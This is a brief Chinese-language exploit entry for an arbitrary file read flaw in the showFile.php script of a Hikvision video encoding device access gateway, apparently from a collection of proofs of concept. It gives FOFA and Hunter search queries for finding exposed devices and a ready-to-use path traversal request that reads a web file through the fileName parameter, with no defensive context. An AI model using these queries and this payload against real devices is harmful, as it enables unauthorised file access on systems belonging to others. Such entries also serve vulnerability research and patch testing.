# HiKVISION 视频编码设备接入网关 showFile.php 任意文件读取漏洞

## 网络测绘

fofa: app="HIKVISION-视频编码设备接入网关"

hunter: app.name="Hikvision 海康威视视频编码设备接入网关"

## POC / EXP

```
/serverLog/showFile.php?fileName=../web/html/main.php
```